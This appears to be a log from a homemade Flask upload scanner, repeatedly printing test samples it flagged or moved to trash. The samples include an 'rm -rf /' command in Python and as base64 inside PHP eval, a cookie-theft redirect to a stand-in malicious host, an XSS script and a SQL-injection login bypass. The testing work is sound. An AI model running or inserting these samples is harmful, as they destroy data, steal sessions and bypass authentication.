2025-02-22 20:31:34,926 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:34,932 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:34,941 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:31:34,942 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:34,943 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:34,944 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:34,945 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:34,946 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:34,952 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:34,953 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:34,958 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:34,965 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:31:34,965 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:34,966 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:34,969 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:34,970 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:34,973 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:34,974 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:34,975 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:34,981 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:34,988 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:31:34,988 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:34,989 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:34,991 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:34,992 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:34,993 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:34,998 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:35,000 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:35,005 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:35,012 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:31:35,012 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:35,014 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:35,015 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:35,016 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:35,017 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:35,019 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:35,020 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:35,021 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:35,026 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:35,034 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:31:35,034 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:35,035 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:35,036 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:35,037 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:35,038 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:35,039 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:35,041 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:35,042 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:35,043 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:35,044 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:35,049 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:35,056 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:31:35,056 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:35,057 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:35,058 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:35,060 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:35,061 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:35,062 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:35,063 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:35,066 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:35,067 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:35,068 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:35,074 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:35,082 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:31:35,082 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:35,083 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:35,084 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:35,086 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:35,087 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:35,088 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:35,089 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:35,090 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:35,091 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:35,092 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:35,098 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:35,105 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:31:35,105 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:35,107 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:35,108 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:35,109 - Error scanning uploads/flask_file_upload_2/flask_file_upload: [Errno 21] Is a directory: 'uploads/flask_file_upload_2/flask_file_upload'
2025-02-22 20:31:35,111 - 127.0.0.1 - - [22/Feb/2025 20:31:35] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:31:35,116 - 127.0.0.1 - - [22/Feb/2025 20:31:35] "GET / HTTP/1.1" 200 -
2025-02-22 20:31:41,112 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:31:41,113 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:31:41,113 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:31:41,117 - 127.0.0.1 - - [22/Feb/2025 20:31:41] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:31:41,126 - 127.0.0.1 - - [22/Feb/2025 20:31:41] "GET / HTTP/1.1" 200 -
2025-02-22 20:38:33,591 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:33,596 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:33,597 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:33,600 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:33,601 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,602 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,604 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,605 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,606 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,607 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:33,612 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,613 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,615 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:33,617 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:33,618 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:33,621 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:33,622 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,623 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,624 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,625 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,626 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,627 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:33,634 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,635 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,636 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
